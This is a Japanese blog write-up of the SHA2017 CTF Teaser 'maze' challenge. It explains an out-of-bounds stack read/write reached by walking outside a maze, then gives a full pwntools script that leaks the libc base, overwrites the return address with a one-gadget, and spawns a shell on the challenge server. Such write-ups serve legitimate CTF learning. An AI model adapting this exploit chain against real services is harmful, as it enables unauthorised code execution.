---
layout: post
redirect_from:
  - /writeup/ctf/2017/sha2017-ctf-teaser-maze/
  - /blog/2017/06/11/sha2017-ctf-teaser-maze/
date: "2017-06-11T22:37:51+09:00"
tags: [ "ctf", "writeup", "pwn", "sha-ctf" ]
---

# SHA2017 CTF Teaser: maze

guessingなどはなく正しくpwnではあるが、なんだか手間な感じがありあまり好きでない。

## problem

-   迷路を探索するやつ
-   各座標ごとにアイテムが置いてあって拾ったり置いたりできる
-   座標ごとのアイテムの数はスタック上にある

## solution

座標の範囲チェックはないので、迷路の外に出てアイテムを拾ったり置いたりすればスタックを勝手に書き換えられる。
libc baseはrspより低位の側を見れば `<_IO_fgets+173>` として見つかる。
return addr は room $1060$。stackに$0$をたくさん作れるのでone gadget RCEすれば刺さる。
room $1060$への移動はなんだか運っぽいので適当にする。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='maze.stillhackinganyway.nl')
parser.add_argument('port', nargs='?', default=8001, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='maze')
parser.add_argument('--libc', default='/lib/x86_64-linux-gnu/libc.so.6') # eea5f41864be6e7b95da2f33f3dec47f
args = parser.parse_args()
context.log_level = args.log_level
elf = ELF(args.binary)
libc = ELF(args.libc)
one_gadget = 0xf0567

# print the maze
h = 32
w = 32
letters = 'nswe'
delta = [ -32, +32, -1, +1 ]
walls = bytearray(elf.read(elf.symbols['walls'], h * w))
s = ''
for y in range(h):
    s0 = ''
    s1 = ''
    s2 = ''
    for x in range(w):
        room = y * w + x
        wall_n = bool(walls[room] & (1 << letters.index('n')))
        wall_s = bool(walls[room] & (1 << letters.index('s')))
        wall_w = bool(walls[room] & (1 << letters.index('w')))
        wall_e = bool(walls[room] & (1 << letters.index('e')))
        s0 += '#%c#' % '.#'[wall_n]
        s1 += '%c %c' % ('.#'[wall_e], '.#'[wall_w])
        s2 += '#%c#' % '.#'[wall_s]
    s += s0 + '\n'
    s += s1 + '\n'
    s += s2 + '\n'
log.info('maze:\n%s', s)

p = remote(args.host, args.port)
def read_prompt(flush=True):
    if flush:
        p.sendline()
    p.recvuntil('You are in room: ')
    room = int(p.recvline())
    p.recvuntil('Room contains: ')
    room_contains = int(p.recvuntil(' '))
    p.recvuntil('mate. You have: ')
    you_have = int(p.recvuntil(' '))
    p.recvuntil('mate.')
    log.info('room: %d', room)
    return room, room_contains, you_have
def move_for(c, take=False):
    _, room_contains, _ = read_prompt(flush=False)
    if take:
        p.sendline('take %d' % room_contains)
        read_prompt(flush=False)
    p.sendline(c)

# read libc base
for _ in range(34):
    move_for('w')
IO_fgets_173 = 0
_, room_contains, _ = read_prompt()
IO_fgets_173 += room_contains
move_for('w')
_, room_contains, _ = read_prompt()
IO_fgets_173 *= 0x10000
IO_fgets_173 += room_contains
move_for('w')
_, room_contains, _ = read_prompt()
IO_fgets_173 *= 0x10000
IO_fgets_173 += room_contains
for _ in range(34 + 2):
    move_for('e')
room, _, _ = read_prompt()
log.info('<_IO_fgets+173>: %#x', IO_fgets_173)
assert room == 0
libc_base = IO_fgets_173 - libc.symbols['_IO_fgets'] - 173
log.info('libc base: %#x', libc_base)

# goto 1023
def go(room, visited):
    visited[room] = True
    if room == 1023:
        return []
    for i in range(4):
        c = letters[i]
        if 0 <= room + delta[i] < h * w:
            if not (walls[room] & (1 << i)) and not visited[room + delta[i]]:
                result = go(room + delta[i], visited)
                if result is not None:
                    return result + [ letters[i] ]
result = go(0, [ False ] * (h * w))
for c in reversed(result):
    move_for(c, take=True)
room, room_contains, you_have = read_prompt()
assert room == 1023

# goto 1023 + 37 (return addr)
for _ in range(6):
    move_for('e')
move_for('s')
room, _, _ = read_prompt()
while room < 1023 + 37 + 32:
    move_for('e')
    moved_room, _, _ = read_prompt()
    assert room != moved_room
    room = moved_room
move_for('n')
room, room_contains, you_have = read_prompt()
assert room == 1023 + 37

# overwrite the return address
log.info('write: %#x', libc_base + one_gadget)
_, room_contains, _ = read_prompt(flush=False)
p.sendline('take %d' % room_contains)
read_prompt(flush=False)
p.sendline('drop %d' % ((libc_base + one_gadget) % 0x10000))
move_for('e')
_, room_contains, _ = read_prompt(flush=False)
p.sendline('take %d' % room_contains)
read_prompt(flush=False)
p.sendline('drop %d' % ((libc_base + one_gadget) / 0x10000 % 0x10000))
move_for('e')
_, room_contains, _ = read_prompt(flush=False)
p.sendline('take %d' % room_contains)
read_prompt(flush=False)
p.sendline('drop %d' % ((libc_base + one_gadget) / 0x10000 / 0x10000 % 0x10000))

# return to 1023
for _ in range(10):
    move_for('n')
    move_for('e')
room, _, _ = read_prompt()
result = go(room, [ False ] * (h * w))
for c in reversed(result):
    move_for(c, take=True)
room, _, _ = read_prompt()
assert room == 1023

# exit the main function
_, _, you_have = read_prompt()
p.sendline('drop %d' % (you_have - 31337))
p.recvuntil('flag.txt')

# shell
time.sleep(1)
p.sendline('id')
p.interactive()
```
